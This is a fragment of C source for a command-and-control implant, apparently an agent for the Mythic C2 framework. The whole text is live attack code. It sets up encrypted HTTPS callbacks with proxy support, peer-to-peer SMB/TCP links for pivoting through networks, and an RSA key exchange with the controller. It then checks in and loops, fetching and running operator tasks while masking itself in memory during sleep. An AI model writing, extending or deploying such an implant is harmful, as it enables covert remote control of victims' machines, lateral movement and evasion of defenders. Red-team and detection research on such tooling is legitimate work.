	    && state.params.aes_key != NULL && MSVCRT$strlen(state.params.aes_key) > 0) {
		unsigned char key_buf[33];
		if (base64_decode(state.params.aes_key, MSVCRT$strlen(state.params.aes_key), (char *)key_buf) == 0) {
			for (int i = 0; i < 32; i++) {
				state.aes_key[i] = key_buf[i];
			}
			state.crypto_enabled = 1;
		}
		#ifdef CELEBI_DEBUG
		dprintf("AES256-HMAC crypto enabled.");
		#endif
	}
	
	state.http = NULL;
	if (state.params.p2p_profile == NULL || MSVCRT$strcmp(state.params.p2p_profile, "none") == 0) {
		state.http = HttpInit(state.params.callback_https, NULL, state.params.headers,
		                      state.params.proxy_host, state.params.proxy_port,
		                      state.params.proxy_user, state.params.proxy_pass);
	}
	
	// P2P child (smb/tcp profile): bind the server and wait for the parent to
	// connect. All Mythic traffic (EKE, checkin, tasking) flows over this channel.
	if (state.params.p2p_profile != NULL && MSVCRT$strcmp(state.params.p2p_profile, "none") != 0) {
		state.is_p2p_child = 1;
		if (p2p_server_start(&state.p2p_peer, &state.params) != 0) {
			#ifdef CELEBI_DEBUG
			dprintf("P2P server failed to start (profile %s)", state.params.p2p_profile);
			#endif
			agent_exit(&state, NULL);
			return;
		}
		#ifdef CELEBI_DEBUG
		dprintf("P2P channel established (profile %s)", state.params.p2p_profile);
		#endif
	}
	
	// RSA Encrypted Key Exchange (staging_rsa) when the payload requested it.
	// After this completes, state.aes_key holds the session key and the checkin
	// is sent with the temp staging UUID as the envelope UUID.
	if (state.params.encrypted_exchange_check != NULL && MSVCRT$strcmp(state.params.encrypted_exchange_check, "true") == 0) {
		EKE_RSA rsa = { 0 };
		if (eke_init(&rsa) == 0) {
			char temp_uuid[37] = { 0 };
			char session_key_b64[1024] = { 0 };
			if (perform_staging(&state, &rsa, temp_uuid, sizeof(temp_uuid), session_key_b64, sizeof(session_key_b64)) == TRUE) {
				unsigned char session_key[32];
				if (eke_decrypt_session_key(&rsa, session_key_b64, session_key) == 0) {
					for (int i = 0; i < 32; i++) {
						state.aes_key[i] = session_key[i];
					}
					state.crypto_enabled = 1;
					state.staging_uuid = clone_str(temp_uuid);
					#ifdef CELEBI_DEBUG
					dprintf("RSA EKE complete, staging uuid: %s", temp_uuid);
					#endif
				} else {
					#ifdef CELEBI_DEBUG
					dprintf("RSA EKE failed to decrypt the session key");
					#endif
				}
			} else {
				#ifdef CELEBI_DEBUG
				dprintf("RSA EKE staging exchange failed");
				#endif
			}
		} else {
			#ifdef CELEBI_DEBUG
			dprintf("RSA EKE init failed");
			#endif
		}
		eke_cleanup(&rsa);
	}
	
	#ifdef CELEBI_DEBUG
	dprintf("Checking in...");
	#endif
	
	CheckinReply checkin_reply = { 0 };
	BOOL checkin_result = perform_checkin(&state, &checkin_reply);
	
	if ((checkin_result == FALSE) || (checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
		#ifdef CELEBI_DEBUG
		dprintf("Checkin failed with: %s", checkin_reply.status);
		#endif
		
		free_checkin_reply(&checkin_reply);
		agent_exit(&state, NULL);
		return;
	}
	
	state.params.callback_uuid = clone_str(checkin_reply.callback_uuid);
	free_checkin_reply(&checkin_reply);
	
	#ifdef CELEBI_DEBUG
	dprintf("Successful checkin with payload UUID %s and callback UUID %s", state.params.payload_uuid, state.params.callback_uuid);
	#endif
	
	remove_from_vault(&state.file_vault, state.builtin_picos.checkin);
	state.builtin_picos.checkin = "(UNALLOCATED)";
	
	while (1) {
		sleep_mask(&state);
		
		// Collect any frames from linked p2p children (works for egress agents
		// and p2p children alike — both can hold links for pivoting).
		agent_p2p_drain(&state);
		
		TaskingReply tasking_reply = { 0 };
		BOOL task_result = perform_tasking(&state, &tasking_reply);
		
		#ifdef CELEBI_DEBUG
		if (task_result == TRUE) {
			dprintf("Received tasking from C2 server!");
		} else {
			dprintf("Failed to get tasking from C2 server.");
		}
		#endif
		
		if (task_result == FALSE) {
			continue;
		}
		
		// Relay Mythic's delegate responses back to linked children.
		agent_p2p_relay_responses(&state, &tasking_reply);
		
		for (int i = 0; i < tasking_reply.tasking_size; i++) {
			process_task(&tasking_reply.tasks[i], &state);
		}
		
		free_tasking_reply(&tasking_reply);
	}
}
